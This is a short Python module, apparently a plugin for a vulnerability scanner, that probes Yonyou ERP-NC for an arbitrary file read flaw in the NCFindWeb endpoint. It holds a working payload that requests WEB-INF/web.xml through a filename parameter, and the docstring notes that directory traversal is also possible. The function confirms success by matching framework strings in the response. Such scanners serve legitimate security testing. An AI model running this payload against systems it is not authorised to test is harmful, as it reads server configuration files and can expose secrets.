#!/usr/bin/env python3
# -*- coding:utf-8 -*-

yonyou_nc_fileRead_payloads = [
    {'path': 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'},
]

def nc_fileRead_scan(self, clients):
    ''' 用友ERP-NC NCFindWeb接口任意文件读取/下载漏洞
            也可以目录遍历
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': self.app_name + 'ERP-NC',
        'vul_type': 'FileRead',
        'vul_id': 'NC-fileRead',
    }

    for payload in yonyou_nc_fileRead_payloads:
        path = payload['path']
        
        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
                'Request': res,
            }
            return results
    return None
